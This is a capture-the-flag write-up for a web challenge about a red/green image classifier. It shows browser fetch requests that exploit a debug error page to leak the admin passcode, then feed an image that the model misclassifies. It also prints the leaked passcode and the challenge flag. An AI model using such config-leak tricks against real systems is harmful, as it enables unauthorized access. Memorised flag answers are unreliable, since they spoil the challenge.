# shallow_mind

## by *kaipan*

### Challenge Premise

We got a website that uses an advanced AI algorithm to determine whether an image is red or green with state of the art machine learning technology and statistical methods never seen before. We are given the source code and we need to analyze it in order to get the flag.

### Source Code Analysis Pain

Honestly my brain no workie too good and I can only roughly understand the source code with my three braincells, so I'll go over the important parts. The important stuff is in **server.py**. Here I have highlighted some important snippets:

```python
# Test auth route
@app.post("/authtest")
def authTest(request: Request) -> HTTPResponse:
  # TODO: delete route, it's useless
  body = request.json
  if 'admin' in body:
    if hash(body['admin']) == hash(app.config.PASSCODE):
      return text('yeah boii')
  # only return dev logic if we're verified dev
  assert body['devcode'] == app.config.DEVCODE
  raise ServerError(f"{body['admin']} is incorrect", status_code=401,quiet=False,context=app_context)
```

This is the test authentication route, we can use this to determine the correct admin credentials which will be important for when we actually classify our own images using the AI system. We can see that it checks for an "admin" key in the request body, and we make sure its value matches a given passcode that we don't know. Of course, we don't know the passcode as of yet, but we can figure it out using the next section of the snippet. It checks the request for a "devcode" key and makes sure its value matches the configured devcode of the website. If we pass this assert, but get the password wrong, then we get a server error returned to us as a browser that we can further analyze to potentially figure out the passcode.

We actually know the value of the devcode, since it was set in the previous lines, specifically this line:

```python
# TODO: add devcode
app.config.DEVCODE = None
```

So when we make a POST request (as indicated by `@app.post` in the snippet), we need to just guess the password, and then pass in a value that is equivalent to `None` as the value for the value of the "devcode" property. I did this using the built-in browser console and the following code (`null` is used to represent `None` in this case):

``fetch('/authtest', {method:'POST', body:JSON.stringify({"admin": "password", "devcode": null})})``

We get the following as a response:

````javascript
⚠️ 401 — Unauthorized
=====================
password is incorrect


Context
    _FALLBACK_ERROR_FORMAT: "<sanic.helpers.Default object at 0x7fa7346ed730>"
    ACCESS_LOG: "True"
    AUTO_EXTEND: "True"
    AUTO_RELOAD: "False"
    EVENT_AUTOREGISTER: "False"
    FORWARDED_FOR_HEADER: "X-Forwarded-For"
    FORWARDED_SECRET: "None"
    GRACEFUL_SHUTDOWN_TIMEOUT: "15.0"
    KEEP_ALIVE_TIMEOUT: "5"
    KEEP_ALIVE: "True"
    MOTD: "True"
    MOTD_DISPLAY: "{}"
    NOISY_EXCEPTIONS: "False"
    PROXIES_COUNT: "None"
    REAL_IP_HEADER: "None"
    REGISTER: "True"
    REQUEST_BUFFER_SIZE: "65536"
    REQUEST_MAX_HEADER_SIZE: "8192"
    REQUEST_ID_HEADER: "X-Request-ID"
    REQUEST_MAX_SIZE: "100000000"
    REQUEST_TIMEOUT: "60"
    RESPONSE_TIMEOUT: "60"
    TOUCHUP: "True"
    USE_UVLOOP: "<sanic.helpers.Default object at 0x7fa7346ed730>"
    WEBSOCKET_MAX_SIZE: "1048576"
    WEBSOCKET_PING_INTERVAL: "20"
    WEBSOCKET_PING_TIMEOUT: "20"
    _converters: "[<class 'str'>, <function str_to_bool at 0x7fa733a37d30>, <class 'float'>, <class 'int'>]"
    _LOGO: ""
    PASSCODE: "yxB5X7{G(<,:;kJR"
    _init: "True"
    DEBUG: "False"
````

We can see that the passcode is actually returned to us and it is **yxB5X7{G(<,:;kJR**. Now we have the correct passcode for the value of the "admin" key.

Now we get onto the classification part; here is the respective code:

```python
@app.post("/classify")
async def classify(request: Request) -> HTTPResponse:
  body = request.json
  # simply an innocent optimization, not a lie--we'd never do that!
  if 'option' in body:
    return text(PRESETS[int(body['option'])], 200)
  # ok, now the actual algorithm
  if 'admin' in body:
    if body['admin'] == app.config.PASSCODE:
      if 'pic' in body:
        loop = asyncio.get_event_loop()
        answer = await loop.run_in_executor(None, BigBadMLCheck, body['pic'])
        if answer == 'flag':
          return text(app.config.FLAG)
        return text(answer)
      return text('ERR: no body found.', 400)
  return text('no no no, you can\'t access this API route.', 400)
```

The second half is the important part. It checks for the "admin" key, and then whether the value matches the passcode, which we found earlier with the test auth route, before getting a picture from the "pic" key and passing it to the classification algorithm. If the algorithm returns "flag", then we get a response back with the actual flag file's flag.

The actual classification algorithm code is not too important. The only things you need to know is that the AI classifies the image using its own training data and also confirms the actual colors (by pixels) using some third party library that I don't care to remember. If the actual color is different from the predicted colors (ex. actual color should be green but AI predicts red or vice versa), then the code returns "flag" which is used in the classify route to pass the return value check and give us the actual flag as a response from the route.

Fortunately, the AI algorithm is somehow worse then my own brain, which truly makes it a marvel of engineering as it can barely tell reds and greens apart. Even I could do that smh. So all you need to do is find an image with complex colors (images that aren't straight up just red or green or shades of red or green or predominantly one color or the other) or colors that aren't red and green at all and the algorithm will freak out and predict the wrong thing and give us the flag. The algorithm takes an image URL, which will be the value of the "pic" key that we will use in the POST request to the classify route.

I used the following code to cheese the AI, but you can use whatever image URL you want that actually works as long as you have the admin credentials in there (you no longer need the devcode thingy):

`fetch('/classify', {method:'POST', body:JSON.stringify({"admin": "yxB5X7{G(<,:;kJR", "pic": "https://i.imgur.com/QzzRkt2h.jpg"})})`

We check the response using the network tool within our built-in browser tools to view the response which contains the flag.

The reason this works is because the AI was trained on a garbage small dataset so it isn't very good at telling colors apart I guess, which is kinda tragic lmao.

### Flag

`osu{1_d0nt_kn0w_h0w_2_tr41n_nu3r4l_n3t5}`